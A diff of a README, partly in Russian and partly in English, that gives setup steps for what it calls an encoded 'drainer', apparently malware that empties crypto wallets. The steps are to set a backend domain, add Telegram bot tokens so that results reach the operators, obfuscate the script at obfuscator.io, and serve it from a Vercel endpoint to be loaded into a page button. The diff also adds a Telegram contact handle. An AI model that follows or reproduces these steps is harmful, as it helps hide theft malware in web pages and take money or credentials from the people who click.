@@ -1,28 +1,7 @@
-## 1. Что надо поменять:
-
-
-
-
-1. decoded_axiom.js 
-    - строка 77: меняем ссылку на домен с backend частью (server, api, ...)
-2. server/index.ts
-    - строка 389: botToken - ключ от @BotFather
-    - строка 390: botToken - userID (можно несколько через запятую), всем кто указан в этом массиве будут приходить результаты
-    - строка 43-44: такая же логика как для строк 389-390
-
-## 2. После изменений
-
-1. Идем на сайт - https://obfuscator.io/ и вставляем туда содержимое нашего уже изменненого decoded_axiom.js
-2. Вставляем зашифрованный код в server/scripts.txt и scripts/api/scripts.txt
-
-## 3. Деплоим
-
-## 3. На фронте
-   1. Запрос к https://server-sigma-orcin-39.vercel.app/?fetchScript=True - в ответ получаем наш закодированный дрейнер в виде текста (который мы пихаем в кнопку)
+Telegram @nxjayce
 
 
 ## 1. What needs to be changed:
-
 1. decoded_axiom.js
 - line 77: change the link to the domain with the backend part (server, api, ...)
 2. server/index.ts
